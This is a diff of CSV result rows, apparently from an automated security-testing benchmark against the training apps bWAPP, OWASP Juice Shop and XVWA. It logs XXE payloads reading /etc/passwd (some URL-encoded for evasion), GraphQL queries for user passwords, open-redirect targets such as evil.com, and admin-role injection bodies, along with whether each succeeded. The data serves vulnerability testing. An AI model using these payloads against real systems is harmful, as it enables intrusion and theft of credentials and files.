+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,3,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,47,,2026-10-19T02:49:02.364369+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,4,"<!entity xxe SYSTEM ""file:///etc/passwd"">",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,47,,2026-10-19T02:49:02.677074+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,5,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:49:02.703916+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Advanced,6,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>",200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:49:02.715981+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,1,%3C!DOCTYPE%20data%20[%3C!ENTITY%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:49:02.720837+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,2,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:49:02.726167+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,3,%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:49:02.730635+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,4,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,62,,2026-10-19T02:49:02.733342+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,5,%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,78,,2026-10-19T02:49:02.740001+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,XXE,Evasion,6,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E,200,XML_PARSER_SIGNAL_UNCONFIRMED,false,xml_parse_or_reflection_text,,63,,2026-10-19T02:49:02.744691+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Basic,1,"{ users{id,password}}",200,NO_CONFIRMATION_SIGNAL,false,,,515,,2026-10-19T02:49:03.220298+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Basic,2,"{user(id:""1""){email}}",200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.815057+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Basic,3,{ user(id:1){password}},200,NO_CONFIRMATION_SIGNAL,false,,,110,,2026-10-19T02:49:02.827749+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Basic,4,{user(id:1){password}},200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.825972+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Basic,5,"{users{id,password}}",200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:49:02.858362+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,1,"{user(id:""1""){email}}",200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:49:02.863476+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,2,{user(id:1){password}},200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:49:02.868782+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Advanced,3,"{users{id,password}}",200,NO_CONFIRMATION_SIGNAL,false,,,125,,2026-10-19T02:49:02.873408+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,1,%7B%20user(id:1)%7Bpassword%7D%7D,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.901690+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,2,%7Buser(id:%221%22)%7Bemail%7D%7D,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:02.906585+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,3,"%7B%20users%7Bid,password%7D%7D",200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:49:02.935874+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,4,%7Buser(id:1)%7Bpassword%7D%7D,200,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:02.952600+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,GraphQL Injection,Evasion,5,"%7Busers%7Bid,password%7D%7D",200,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:49:02.957753+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Basic,1,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,234,,2026-10-19T02:49:03.265660+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Basic,2,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:49:03.096569+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Basic,3,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:03.142710+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Basic,4,https://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:03.143334+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Advanced,1,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:03.143868+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Advanced,2,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:49:03.143868+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Advanced,3,https://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:49:04.395485+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Advanced,4,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,109,,2026-10-19T02:49:04.459140+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Evasion,1,//evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:04.463647+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Evasion,2,https://evil.com,406,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:04.466414+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Evasion,3,https://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,93,,2026-10-19T02:49:04.473034+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,Open Redirect,Evasion,4,http://attacker.com,406,NO_CONFIRMATION_SIGNAL,false,,,94,,2026-10-19T02:49:04.476578+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Basic,1,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,1484,,2026-10-19T02:49:04.357290+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Basic,2,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,62,,2026-10-19T02:49:02.928163+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Basic,3,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,78,,2026-10-19T02:49:02.980820+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Basic,4,https://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,78,,2026-10-19T02:49:02.985844+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Advanced,1,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,94,,2026-10-19T02:49:03.023302+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Advanced,2,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,78,,2026-10-19T02:49:03.019089+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Advanced,3,https://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,78,,2026-10-19T02:49:03.034434+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Advanced,4,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,79,,2026-10-19T02:49:03.038919+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Evasion,1,//evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,78,,2026-10-19T02:49:03.051438+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Evasion,2,https://evil.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,evil.com,78,,2026-10-19T02:49:03.055061+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Evasion,3,https://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,47,,2026-10-19T02:49:03.059608+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,Open Redirect,Evasion,4,http://attacker.com,302,EXTERNAL_REDIRECT_CONFIRMED,true,external_location_not_followed,attacker.com,31,,2026-10-19T02:49:03.062200+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Basic,1,"{""role"":""admin""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,328,,2026-10-19T02:49:04.712120+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Basic,2,"{""access"":""root""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,157,,2026-10-19T02:49:04.537772+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Basic,3,"{""admin"":true}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,312,,2026-10-19T02:49:04.720255+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Advanced,1,"{""role"":""admin""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,110,,2026-10-19T02:49:04.577084+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Advanced,2,"{""admin"":true}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,125,,2026-10-19T02:49:04.588564+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Advanced,3,"{""access"":""root""}",200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,125,,2026-10-19T02:49:04.597772+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Evasion,1,%7B%22role%22:%22admin%22%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,141,,2026-10-19T02:49:04.607632+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Evasion,2,%7B%22access%22:%22root%22%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,141,,2026-10-19T02:49:04.615974+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,OWASP_Juice_Shop,API Abuse,Evasion,3,%7B%22admin%22:true%7D,200,API_RESPONSE_UNCONFIRMED,false,http_200_without_privilege_or_rate_limit_oracle,,109,,2026-10-19T02:49:04.659249+00:00
